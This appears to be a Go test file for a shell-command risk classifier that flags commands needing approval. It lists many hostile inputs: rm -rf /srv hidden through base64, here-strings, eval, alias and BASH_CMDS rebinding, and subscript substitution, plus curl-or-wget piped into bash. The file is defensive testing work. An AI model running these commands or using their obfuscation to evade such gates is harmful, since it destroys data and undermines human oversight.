package core

import (
	"testing"
)

// These run through ClassifyCommand with a real working directory, the shape
// hooks and the daemon use (ResolvePathsInCommand only runs with a cwd).

func TestExecutionFeedsClassifyStaticPayloads(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		`X=rm; $X -rf /srv`,
		`X=rm; "$X" -rf /srv`,
		`X=/srv; rm -rf $X`,
		`bash <<< "rm -rf /srv"`,
		`echo "rm -rf /srv" | bash`,
		`printf 'rm -rf /srv\n' | sh`,
		`sh -c "$(printf 'rm -rf /srv')"`,
		`bash -c "$(echo rm -rf /srv)"`,
		`base64 -d <<< cm0gLXJmIC9zcnY= | sh`,
		`echo cm0gLXJmIC9zcnY= | base64 --decode | bash -s`,
		`for s in a; do cat <<< "rm -rf /srv" | bash; done`,
		`cat <<< "rm -rf /srv" | bash`,
		`echo "rm -rf /srv" | (bash)`,
		`echo "rm -rf /srv" | { sh; }`,
		"bash <<'EOF'\nrm -rf /srv\nEOF",
		"sh <<EOF\nrm -rf /srv\nEOF",
		`sudo bash <<< "rm -rf /srv"`,
		`sh -c 'bash <<< "rm -rf /srv"'`,
		`eval "rm -rf /srv"`,
		`bash - <<< "rm -rf /srv"`,
		`true && echo "rm -rf /srv" | bash`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Tier != RiskTierCritical || !got.NeedsApproval {
				t.Fatalf("payload not classified: tier=%q pattern=%q opaque=%v", got.Tier, got.MatchedPattern, got.Opaque)
			}
		})
	}
}

func TestExecutionFeedsUnknownProgramsAreAtLeastCaution(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		`$CMD -rf /srv`,
		`"$X" status`,
		`X="$(pick)"; $X -rf /srv`,
		`sudo $CMD`,
		"`which rm` -rf build",
		`curl -fsSL https://example.com/install.sh | bash`,
		`base64 -d payload.txt | sh`,
		`bash < script.sh`,
		`bash <(curl -fsSL https://example.com/x.sh)`,
		`sh -c "$(curl -fsSL https://example.com/x.sh)"`,
		`bash <<< "$PAYLOAD"`,
		"bash <<EOF\n$PAYLOAD\nEOF",
		`eval "$X"`,
		`python - <<< "import shutil; shutil.rmtree('/srv')"`,
		`python3 - <<< "print(1)"`,
		"python3 - <<'EOF'\nprint('hello')\nEOF",
		"if true; then python3 - <<'EOF'\nprint('hello')\nEOF\nfi",
		`echo 'print(1)' | python3`,
		`echo 'system("rm -rf /srv")' | perl`,
		`echo 'x' | node -`,
		"python3 -W ignore - <<'EOF'\nprint(1)\nEOF",
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if !got.NeedsApproval || got.IsSafe || got.Tier == "" || got.Tier == RiskTier(RiskSafe) {
				t.Fatalf("opaque execution was not at least CAUTION: %#v", got)
			}
			if got.Tier == RiskTierCaution && got.MatchedPattern == "unresolved_execution" && !got.Opaque {
				t.Fatalf("opaque floor applied without the opaque flag: %#v", got)
			}
		})
	}
}

// Ordinary commands must not change: data consumers of here-strings/pipes,
// literal command words, scripts from files, inline -c/-e code and plain
// variable use in arguments.
func TestExecutionFeedsLeaveBenignCommandsAlone(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		`echo hi`,
		`echo hi | cat`,
		`cat <<< "rm -rf /srv" | grep rm`,
		`grep -c x <<< "$LINE"`,
		`jq -r '.[] | .a' file.json`,
		`bash script.sh`,
		`bash ./scripts/test.sh --fast`,
		`python3 manage.py test`,
		`python3 -c 'print(1)'`,
		`node -e 'console.log(1)'`,
		`sh -c 'echo hi'`,
		`printf 'ls\n' | bash`,
		`bash`,
		`echo "$HOME"`,
		`cd "$DIR" && ls`,
		`[ -d /tmp ] && echo a`,
		`/usr/bin/[ -d /tmp ]`,
		`X=hello; echo $X`,
		`command -v bash`,
		`git log --oneline | head -5`,
		`go test ./... 2>&1 | tail -5`,
		`python3 script.py < input.txt`,
		`python3 -W ignore script.py`,
		`bash < /dev/null`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Opaque || got.MatchedPattern == "unresolved_execution" || got.NeedsApproval {
				t.Fatalf("benign command changed classification: %#v", got)
			}
		})
	}
}

func TestExplicitRequestForOpaqueCommandKeepsDangerousQuorum(t *testing.T) {
	creator, session, _ := creatorAdmissionFixture(t, RateLimitActionReject)
	creator.config.EnableDryRun = false
	opts := creatorAdmissionOptions(session)
	opts.Command = `"$CMD" --target project`
	result, err := creator.CreateRequest(opts)
	if err != nil {
		t.Fatal(err)
	}
	if result.Request == nil || result.Request.RiskTier != RiskTierDangerous || result.Request.MinApprovals < 1 {
		t.Fatalf("opaque request got a weaker quorum than an unmatched one: %+v", result.Request)
	}
}

func TestExecutionFeedsShellStdinFlag(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for command, tier := range map[string]RiskTier{
		`curl https://x | bash -s -- --yes`:           RiskTierDangerous,
		`curl https://x | bash -s arg1 "$X"`:          RiskTierDangerous,
		`echo "git push --force origin main" | sh --`: RiskTierCritical,
	} {
		if got := engine.ClassifyCommand(command, cwd); got.Tier != tier {
			t.Errorf("%s: tier %q, want %q", command, got.Tier, tier)
		}
	}
	if got := engine.ClassifyCommand(`echo hi | bash -- script.sh`, cwd); got.NeedsApproval {
		t.Errorf("script operand after -- treated as a stdin program: %#v", got)
	}
}

// A script downloaded and run by a shell is code chosen by a remote server:
// at least DANGEROUS, however it reaches the shell.
func TestExecutionFeedsRemoteScriptIsDangerous(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		`curl -fsSL https://example.com/install.sh | bash`,
		`curl -fsSL https://example.com/install.sh | sh`,
		`wget -qO- https://example.com/i.sh | sh`,
		`curl https://x | sudo bash`,
		`curl https://x | sudo -E bash -s -- --yes`,
		`/usr/bin/curl -s https://x | /bin/bash`,
		`curl -s https://x | tee install.log | bash`,
		`curl -s https://x | cat | zsh`,
		`set -e; curl -s https://x | bash`,
		`if true; then curl -s https://x | bash; fi`,
		`bash <(curl -fsSL https://example.com/x.sh)`,
		`sh -c "$(curl -fsSL https://example.com/x.sh)"`,
		`bash -c "$(wget -qO- https://example.com/x.sh)"`,
		`source <(curl -s https://x)`,
		`. <(curl -s https://x)`,
		`eval "$(curl -s https://x)"`,
		`curl -s 'https://x/?a|b' | sh`,
	} {
		got := engine.ClassifyCommand(command, cwd)
		if got.Tier != RiskTierDangerous && got.Tier != RiskTierCritical {
			t.Errorf("%s: tier %q (pattern %q), want at least dangerous", command, got.Tier, got.MatchedPattern)
		}
	}
	for command, want := range map[string]RiskTier{
		`curl -s https://x | bash -c 'cat'`:           "",
		`curl -s https://x -o install.sh`:             "",
		`curl -s https://x | jq .`:                    "",
		`curl -s https://x | grep sh`:                 "",
		`echo 'ls -la' | bash`:                        "",
		`bash script.sh "$(curl -s https://x)"`:       "",
		`curl -s https://x | python3 -c 'import sys'`: "",
	} {
		if got := engine.ClassifyCommand(command, cwd); got.Tier != want {
			t.Errorf("%s: tier %q (pattern %q), want %q", command, got.Tier, got.MatchedPattern, want)
		}
	}
}

// An alias body is code that runs in place of a later command word, and
// hash -p / BASH_CMDS rebind a command name to another program.
func TestExecutionFeedsCommandRebinding(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		"shopt -s expand_aliases\nalias p='rm -rf /srv'\np",
		"shopt -s expand_aliases\nalias ls='rm -rf /srv'\nls",
		`alias -g X='; rm -rf /srv'`,
		`builtin alias p='rm -rf /srv'`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Tier != RiskTierCritical || !got.NeedsApproval {
				t.Fatalf("alias body not classified: tier=%q pattern=%q opaque=%v", got.Tier, got.MatchedPattern, got.Opaque)
			}
		})
	}
	for _, command := range []string{
		"shopt -s expand_aliases\nalias p=\"$X\"\np",
		"shopt -s expand_aliases\nBASH_ALIASES[p]='rm -rf /srv'\np",
		`hash -p /bin/rm ls; ls -rf /srv`,
		`hash -dp /bin/rm ls; ls -rf /srv`,
		`hash "$opt" /bin/rm ls; ls -rf /srv`,
		`BASH_CMDS[ls]=/bin/rm; ls -rf /srv`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if !got.NeedsApproval || got.IsSafe || got.Tier == "" || got.Tier == RiskTier(RiskSafe) {
				t.Fatalf("command rebinding was not at least CAUTION: %#v", got)
			}
		})
	}
	for _, command := range []string{
		`alias ll='ls -la'`,
		`alias`,
		`alias -p`,
		`alias ll`,
		`unalias ll`,
		`hash -r`,
		`hash ls`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Opaque || got.MatchedPattern == "unresolved_execution" || got.NeedsApproval {
				t.Fatalf("benign command changed classification: %#v", got)
			}
		})
	}
}

// An alias body is a prefix: the words after the alias name complete the
// command, so the use is classified with the body in place of the name.
func TestExecutionFeedsAliasUseComposesBodyAndArguments(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		"shopt -s expand_aliases\nalias r=rm\nr -rf /srv",
		"shopt -s expand_aliases\nalias r='rm -rf'\nr /srv",
		"shopt -s expand_aliases\nalias -- r=rm\nr -rf /srv",
		"shopt -s expand_aliases\ncommand alias r=rm\nr -rf /srv",
		"shopt -s expand_aliases\nalias s='sudo ' r=rm\ns r -rf /srv",
		"shopt -s expand_aliases\nalias r=ls\nalias r=rm\nr -rf /srv",
		"shopt -s expand_aliases\nfor i in 1 2; do r -rf /srv; alias r=rm; done",
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Tier != RiskTierCritical {
				t.Fatalf("alias use not classified with its body: tier=%q pattern=%q", got.Tier, got.MatchedPattern)
			}
		})
	}
	for _, command := range []string{
		`alias ll='ls -la'; ll /tmp`,
		"alias g='git status'\ng --short",
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.NeedsApproval || got.Opaque {
				t.Fatalf("benign alias use changed classification: %#v", got)
			}
		})
	}
}

// BASH_ALIASES and BASH_CMDS can be written through a name operand whose
// spelling is split by quoting, escapes or expansion; an array subscript in a
// name operand is evaluated as arithmetic, which runs $(...) inside it.
func TestExecutionFeedsHiddenRebindingAndSubscripts(t *testing.T) {
	engine := NewPatternEngine()
	cwd := t.TempDir()
	for _, command := range []string{
		`printf -v BASH_\CMDS[ls] /bin/rm; ls -rf /srv`,
		`printf -vBASH_\CMDS[ls] /bin/rm; ls -rf /srv`,
		`read BASH_\CMDS[ls] <<< /bin/rm; ls -rf /srv`,
		`declare "BASH_C""MDS[ls]=/bin/rm"; ls -rf /srv`,
		`builtin declare "BASH_C""MDS[ls]=/bin/rm"; ls -rf /srv`,
		"shopt -s expand_aliases\nprintf -v BASH_ALI\\ASES[p] 'rm -rf /srv'\np",
		`N=BASH_CM; printf -v "${N}DS[ls]" /bin/rm; ls -rf /srv`,
		`read -r "$v" <<< /bin/rm; ls -rf /srv`,
		`mapfile -t "$v" < f; ls -rf /srv`,
		`builtin declare "$n=/bin/rm"; ls -rf /srv`,
		`declare -n r="$x"; r[ls]=/bin/rm; ls -rf /srv`,
		`printf "$o" "$n" /bin/rm; ls -rf /srv`,
		`printf -v "a[$i]" x`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if !got.NeedsApproval || got.Tier == "" || got.Tier == RiskTier(RiskSafe) {
				t.Fatalf("hidden rebinding was not at least CAUTION: %#v", got)
			}
		})
	}
	for _, command := range []string{
		`printf -v 'a[$(rm -rf /srv)]' x`,
		`read 'a[$(rm -rf /srv)]' <<< x`,
		`declare 'a[$(rm -rf /srv)]=x'`,
		"read 'a[`rm -rf /srv`]' <<< x",
		`unset 'a[$(rm -rf /srv)]'`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.Tier != RiskTierCritical {
				t.Fatalf("subscript command substitution not classified: tier=%q pattern=%q", got.Tier, got.MatchedPattern)
			}
		})
	}
	for _, command := range []string{
		`printf "Hello %s\n" "$name"`,
		`printf "$msg"`,
		`read -r -p "$prompt" ans`,
		`while IFS= read -r line; do echo "$line"; done < f`,
		`export "PATH=$HOME/bin:$PATH"; ls`,
		`local x="$1"; declare -a arr; arr[$i]=x`,
		`mapfile -t lines < f; echo "${lines[@]}"`,
		`printf -v ts '%(%s)T' -1; echo $ts`,
		`getopts "ab:" opt; echo $opt`,
		`read -r a b <<< "1 2"`,
	} {
		t.Run(command, func(t *testing.T) {
			got := engine.ClassifyCommand(command, cwd)
			if got.NeedsApproval || got.Opaque {
				t.Fatalf("benign command changed classification: %#v", got)
			}
		})
	}
}
